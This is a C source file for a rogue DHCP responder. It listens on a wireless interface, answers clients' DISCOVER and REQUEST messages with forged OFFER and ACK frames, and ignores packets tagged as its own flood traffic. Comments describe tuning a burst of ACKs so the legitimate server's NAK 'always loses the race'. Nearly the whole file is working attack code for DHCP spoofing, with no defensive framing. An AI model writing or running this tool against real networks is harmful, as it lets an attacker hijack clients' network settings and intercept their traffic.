/*
 * dhcp_responder.c
 *
 * A fast DHCP OFFER/ACK responder.
 *
 *   - Loads offer.bin / ack.bin produced by prepare_packets.py.
 *   - Uses an AF_PACKET raw socket to sniff UDP/67 traffic and to send
 *     the patched frames.
 *   - Only mutates the fields that change per transaction:
 *       Ethernet dst/src, BOOTP xid, BOOTP chaddr, UDP checksum (zeroed).
 *
 *   - FIX B: server identity is no longer a #define.  It is read from
 *            offer.bin's IPv4 source address, so the C side can never
 *            desync from the Python templates.
 *   - FIX C: every DHCPREQUEST that selects us is answered with a burst
 *            of ACKs so the legitimate server's NAK always loses the race.
 *
 * Build:
 *     gcc -O2 -Wall -Wextra -o dhcp_responder dhcp_responder.c
 *
 * Run (must be root, or have CAP_NET_RAW / CAP_NET_ADMIN):
 *     sudo ./dhcp_responder
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>                 /* FIX C: nanosleep */
#include <unistd.h>

/* ---------------- configuration ---------------- */

#define INTERFACE      "wlan0"
#define OFFER_FILE     "offer.bin"
#define ACK_FILE       "ack.bin"

#define FLOOD_TAG      "FLOOD-NOISE"

/* FIX C: ACK burst parameters.
 * Legit-server NAK was observed ~90-100 ms after REQUEST (see pcap).
 * 3 ACKs spanning 0/30/60 ms means the client has bound our lease long
 * before any NAK can arrive. */
#define ACK_BURST         3
#define ACK_BURST_GAP_MS 30

/* ---------------- template frame offsets ---------------- */
/*
 * Layout produced by Scapy (no IP options, so IHL == 5):
 *
 *   Ethernet  :  0 .. 13
 *   IPv4      : 14 .. 33
 *   UDP       : 34 .. 41
 *   BOOTP     : 42 .. 277
 *   DHCP opts : 278 ..
 *
 * We patch:
 *   Ether.dst          @  0     (6)
 *   Ether.src          @  6     (6)
 *   UDP.chksum         @ 40     (2)
 *   BOOTP.xid          @ 46     (4)
 *   BOOTP.chaddr       @ 70     (16)
 */

#define ETH_DST_OFF        0
#define ETH_SRC_OFF        6
#define ETH_TYPE_OFF      12

#define IP_HDR_OFF        14
#define IP_SRC_OFF        (IP_HDR_OFF + 12)   /* FIX B: template's server IP */

#define UDP_CHKSUM_OFF    40

#define BOOTP_XID_OFF     46
#define BOOTP_CHADDR_OFF  70
#define BOOTP_FIXED_LEN   236   /* BOOTP fixed header, without 'vend' */
#define DHCP_COOKIE_LEN     4   /* 0x63 0x82 0x53 0x63               */

/* ---------------- globals ---------------- */

static volatile sig_atomic_t g_running   = 1;
static int                   g_tx_sock   = -1;
static int                   g_ifindex   = 0;
static unsigned char         g_iface_mac[6];
static unsigned char         g_server_ip[4];

static unsigned char        *g_offer     = NULL;
static size_t                g_offer_len = 0;
static unsigned char        *g_ack       = NULL;
static size_t                g_ack_len   = 0;

/* ---------------- helpers ---------------- */

static void on_signal(int sig)
{
    (void)sig;
    g_running = 0;
}

static unsigned char *load_file(const char *path, size_t *out_len)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "open %s: %s\n", path, strerror(errno));
        return NULL;
    }
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long sz = ftell(f);
    if (sz <= 0 || fseek(f, 0, SEEK_SET) != 0) { fclose(f); return NULL; }

    unsigned char *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return NULL;
    }
    fclose(f);
    *out_len = (size_t)sz;
    return buf;
}

static int get_iface_mac(const char *ifname, unsigned char mac[6])
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        close(fd);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

static void mac_str(const unsigned char *m, char out[18])
{
    snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0], m[1], m[2], m[3], m[4], m[5]);
}

/* ---------------- send path ---------------- */

static void send_dhcp(const unsigned char *tmpl, size_t tmpl_len,
                      const unsigned char *client_mac,
                      uint32_t xid,
                      const unsigned char *chaddr,
                      const char *tag)
{
    unsigned char *pkt = malloc(tmpl_len);
    if (!pkt) return;
    memcpy(pkt, tmpl, tmpl_len);

    /* Patch Ethernet header */
    memcpy(pkt + ETH_DST_OFF, client_mac,   6);   /* destination = client */
    memcpy(pkt + ETH_SRC_OFF, g_iface_mac,  6);   /* source      = us      */

    /* Patch BOOTP.xid (big-endian on the wire) */
    pkt[BOOTP_XID_OFF + 0] = (unsigned char)(xid >> 24);
    pkt[BOOTP_XID_OFF + 1] = (unsigned char)(xid >> 16);
    pkt[BOOTP_XID_OFF + 2] = (unsigned char)(xid >>  8);
    pkt[BOOTP_XID_OFF + 3] = (unsigned char)(xid      );

    /* Patch BOOTP.chaddr (16 bytes) */
    memcpy(pkt + BOOTP_CHADDR_OFF, chaddr, 16);

    /* Zero UDP checksum (legal for IPv4) so we don't have to recompute it
     * after mutating the payload. */
    pkt[UDP_CHKSUM_OFF + 0] = 0;
    pkt[UDP_CHKSUM_OFF + 1] = 0;

    /* Send it. */
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = g_ifindex;
    addr.sll_halen    = 6;
    addr.sll_protocol = htons(ETH_P_IP);
    memcpy(addr.sll_addr, client_mac, 6);

    ssize_t n = sendto(g_tx_sock, pkt, tmpl_len, 0,
                       (struct sockaddr *)&addr, sizeof(addr));

    if (n < 0) {
        fprintf(stderr, "sendto: %s\n", strerror(errno));
    } else {
        char mac[18];
        mac_str(client_mac, mac);
        printf("[*] Sent DHCP %-5s (%zd B) -> %s  xid=0x%08x\n",
               tag, n, mac, xid);
    }

    free(pkt);
}

/* ---------------- DHCP option parsing ---------------- */

static void handle_packet(const unsigned char *pkt, size_t len)
{
    /* Absolute minimum: Eth + IP + UDP + BOOTP fixed header. */
    if (len < 14 + 20 + 8 + BOOTP_FIXED_LEN) return;

    /* --- Ethernet --- */
    if (((pkt[ETH_TYPE_OFF] << 8) | pkt[ETH_TYPE_OFF + 1]) != 0x0800)
        return;

    /* --- IPv4 --- */
    if ((pkt[14] >> 4) != 4) return;
    size_t ip_ihl = (size_t)(pkt[14] & 0x0F) * 4;
    if (ip_ihl < 20) return;
    if (pkt[14 + 9] != 17) return;            /* proto != UDP */
    if (len < 14 + ip_ihl + 8 + BOOTP_FIXED_LEN) return;

    /* --- UDP --- */
    size_t udp = 14 + ip_ihl;
    uint16_t sport = (uint16_t)((pkt[udp]     << 8) | pkt[udp + 1]);
    uint16_t dport = (uint16_t)((pkt[udp + 2] << 8) | pkt[udp + 3]);
    if (sport != 68 || dport != 67) return;   /* only client -> server */

    /* --- BOOTP --- */
    size_t bootp = udp + 8;
    if (pkt[bootp] != 1) return;              /* must be a request */

    uint32_t xid =
        ((uint32_t)pkt[bootp + 4] << 24) |
        ((uint32_t)pkt[bootp + 5] << 16) |
        ((uint32_t)pkt[bootp + 6] <<  8) |
        ((uint32_t)pkt[bootp + 7]);

    const unsigned char *chaddr     = pkt + bootp + 28;  /* 16 bytes */
    const unsigned char *client_mac = pkt + ETH_SRC_OFF; /* 6 bytes  */

    /* --- DHCP options --- */
    size_t opt = bootp + BOOTP_FIXED_LEN;

    if (len < opt + DHCP_COOKIE_LEN) return;
    if (memcmp(pkt + opt, "\x63\x82\x53\x63", DHCP_COOKIE_LEN) != 0)
        return;
    opt += DHCP_COOKIE_LEN;

    int msg_type  = 0;
    int is_flood  = 0;
    const unsigned char *server_id = NULL;

    size_t i = opt;
    while (i < len) {
        uint8_t code = pkt[i++];
        if (code == 0)   continue;            /* pad */
        if (code == 255) break;               /* end */
        if (i >= len)    break;

        uint8_t olen = pkt[i++];
        if (i + olen > len) break;

        const unsigned char *data = pkt + i;

        if (code == 53 && olen == 1) {
            msg_type = data[0];
        } else if (code == 60) {
            size_t fl = strlen(FLOOD_TAG);
            if (olen == fl && memcmp(data, FLOOD_TAG, fl) == 0)
                is_flood = 1;
        } else if (code == 54 && olen == 4) {
            server_id = data;
        }

        i += olen;
    }

    if (is_flood) return;

    char mac[18];
    mac_str(client_mac, mac);

    /* DHCP_DISCOVER */
    if (msg_type == 1) {
        printf("[*] DHCP Discover from %s  xid=0x%08x\n", mac, xid);
        send_dhcp(g_offer, g_offer_len, client_mac, xid, chaddr, "Offer");
    }
    /* DHCP_REQUEST */
    else if (msg_type == 3) {
        if (server_id && memcmp(server_id, g_server_ip, 4) != 0) {
            printf("[-] Request from %s for other server, ignoring\n", mac);
            return;
        }
        printf("[*] DHCP Request  from %s  xid=0x%08x  "
               "(burst x%d, %d ms apart)\n",
               mac, xid, ACK_BURST, ACK_BURST_GAP_MS);

        /* FIX C: burst the ACK so the legitimate server's NAK
         * never wins the race. */
        for (int k = 0; k < ACK_BURST; k++) {
            send_dhcp(g_ack, g_ack_len, client_mac, xid, chaddr, "Ack");
            if (k + 1 < ACK_BURST) {
                struct timespec ts = {
                    .tv_sec  = 0,
                    .tv_nsec = ACK_BURST_GAP_MS * 1000L * 1000L
                };
                nanosleep(&ts, NULL);
            }
        }
    }
}

/* ---------------- main ---------------- */

int main(void)
{
    /* Load templates -------------------------------------------------- */
    g_offer = load_file(OFFER_FILE, &g_offer_len);
    if (!g_offer) return 1;
    g_ack   = load_file(ACK_FILE,   &g_ack_len);
    if (!g_ack)   return 1;

    printf("[*] %s: %zu B   %s: %zu B\n",
           OFFER_FILE, g_offer_len, ACK_FILE, g_ack_len);

    /* FIX B: derive the server identity from the templates themselves,
     * so C can never desync from prepare_packets.py. -------------------- */
    if (g_offer_len < IP_SRC_OFF + 4 || g_ack_len < IP_SRC_OFF + 4) {
        fprintf(stderr, "template too small to contain an IPv4 header\n");
        return 1;
    }
    memcpy(g_server_ip, g_offer + IP_SRC_OFF, 4);   /* IP src of OFFER */

    /* sanity: both templates must advertise the same server */
    if (memcmp(g_server_ip, g_ack + IP_SRC_OFF, 4) != 0) {
        fprintf(stderr, "warning: offer.bin and ack.bin advertise "
                        "different server IPs\n");
    }

    char sip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, g_server_ip, sip, sizeof(sip));
    printf("[*] Advertised server IP (from %s): %s\n", OFFER_FILE, sip);

    /* Interface MAC --------------------------------------------------- */
    if (get_iface_mac(INTERFACE, g_iface_mac) < 0) {
        fprintf(stderr, "cannot get MAC of %s: %s\n",
                INTERFACE, strerror(errno));
        return 1;
    }
    printf("[*] %s MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", INTERFACE,
           g_iface_mac[0], g_iface_mac[1], g_iface_mac[2],
           g_iface_mac[3], g_iface_mac[4], g_iface_mac[5]);

    g_ifindex = (int)if_nametoindex(INTERFACE);
    if (g_ifindex == 0) {
        fprintf(stderr, "if_nametoindex(%s): %s\n",
                INTERFACE, strerror(errno));
        return 1;
    }

    /* RX socket ------------------------------------------------------- */
    int rx_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (rx_sock < 0) {
        fprintf(stderr, "socket(AF_PACKET) RX: %s\n", strerror(errno));
        return 1;
    }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_IP);
    sll.sll_ifindex  = g_ifindex;

    if (bind(rx_sock, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        fprintf(stderr, "bind: %s\n", strerror(errno));
        close(rx_sock);
        return 1;
    }

    /* TX socket ------------------------------------------------------- */
    g_tx_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (g_tx_sock < 0) {
        fprintf(stderr, "socket(AF_PACKET) TX: %s\n", strerror(errno));
        close(rx_sock);
        return 1;
    }

    /* Signals --------------------------------------------------------- */
    signal(SIGINT,  on_signal);
    signal(SIGTERM, on_signal);

    printf("[*] Listening for DHCP on %s...\n", INTERFACE);

    /* Main loop ------------------------------------------------------- */
    static unsigned char buf[65536];
    while (g_running) {
        ssize_t n = recv(rx_sock, buf, sizeof(buf), 0);
        if (n < 0) {
            if (errno == EINTR) continue;
            fprintf(stderr, "recv: %s\n", strerror(errno));
            break;
        }
        handle_packet(buf, (size_t)n);
    }

    printf("[*] Shutting down.\n");
    close(rx_sock);
    close(g_tx_sock);
    free(g_offer);
    free(g_ack);
    return 0;
}
